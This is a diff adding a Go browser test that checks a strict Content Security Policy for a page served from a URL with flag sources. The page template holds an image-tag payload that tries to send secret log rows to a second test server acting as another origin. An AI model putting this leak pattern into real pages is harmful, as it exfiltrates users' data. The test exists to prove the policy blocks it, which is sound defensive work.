@@ -4,10 +4,13 @@ package tinkerdown_test
 
 import (
 	"context"
+	"net"
+	"net/http"
 	"net/http/httptest"
 	"os"
 	"path/filepath"
 	"strings"
+	"sync/atomic"
 	"testing"
 	"time"
 
@@ -128,5 +131,66 @@ func TestSourceFlags_E2E(t *testing.T) {
 
 	if t.Failed() {
 		dump()
+	}
+}
+
+// TestRemotePageCSP_E2E serves a page the way serve serves one from a URL,
+// with flag sources. Its template tries to send every row to another origin
+// through an <img>; the strict policy must block that while the page works.
+func TestRemotePageCSP_E2E(t *testing.T) {
+	serverLog := captureServerLog(t)
+	// The default policy allows https: images, so the other origin is https.
+	// Chrome rejects its test certificate, but even trying connects, so the
+	// test counts connections, not requests.
+	var leaked atomic.Int64
+	other := httptest.NewUnstartedServer(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {}))
+	other.Config.ConnState = func(_ net.Conn, s http.ConnState) {
+		if s == http.StateNew {
+			leaked.Add(1)
+		}
+	}
+	other.StartTLS()
+	defer other.Close()
+	otherURL := ConvertURLForDockerChrome(other.URL)
+
+	dir := t.TempDir()
+	os.WriteFile(filepath.Join(dir, "api.log"), []byte("secret one\nsecret two\n"), 0o644)
+	page := "---\ntitle: Remote\nsources:\n  all:\n    type: merge\n    inputs: [\"*\"]\n---\n\n## [All] | [*] source\n\n```lvt\n" +
+		`<ol lvt-source="all" data-testid="log">{{range .Data}}<li data-key="{{.seq}}" class="src-{{.source}}">{{.msg}}<img src="` + otherURL + `/?{{.msg}}" alt=""></li>{{end}}</ol>` + "\n```\n"
+	os.WriteFile(filepath.Join(dir, "page.md"), []byte(page), 0o600)
+
+	cfg := config.DefaultConfig()
+	cfg.FlagSources = map[string]config.SourceConfig{"api": {Type: "stream", File: filepath.Join(dir, "api.log")}}
+	srv := server.NewWithConfig(dir, cfg)
+	srv.ServeSinglePage("page.md", true)
+	if err := srv.Discover(); err != nil {
+		t.Fatal(err)
+	}
+	ts := httptest.NewServer(server.WithCompression(srv))
+	defer ts.Close()
+	defer srv.StopStreams()
+
+	chrome, cleanup := SetupDockerChrome(t, 90*time.Second)
+	defer cleanup()
+	ctx := chrome.Context
+	logs := &streamBrowserLogs{}
+	logs.listen(ctx)
+	dump := func() {
+		t.Logf("console:\n%s", strings.Join(logs.console, "\n"))
+		t.Logf("server log tail: %s", tail(serverLog.String(), 3000))
+	}
+	if err := chromedp.Run(ctx, network.Enable(), chromedp.Navigate(ConvertURLForDockerChrome(ts.URL)),
+		chromedp.WaitVisible(`[data-testid="log"]`, chromedp.ByQuery)); err != nil {
+		dump()
+		t.Fatal(err)
+	}
+	if err := chromedp.Run(ctx, waitForDOM(`document.querySelectorAll("li.src-api").length === 2 && document.querySelectorAll('button[role="tab"]').length === 2`, 15*time.Second)); err != nil {
+		dump()
+		t.Fatalf("the page didn't work under the strict policy: %v", err)
+	}
+	time.Sleep(time.Second) // give any image request time to arrive
+	if n := leaked.Load(); n != 0 {
+		dump()
+		t.Fatalf("the other origin got %d connections; the policy must block them", n)
 	}
 }
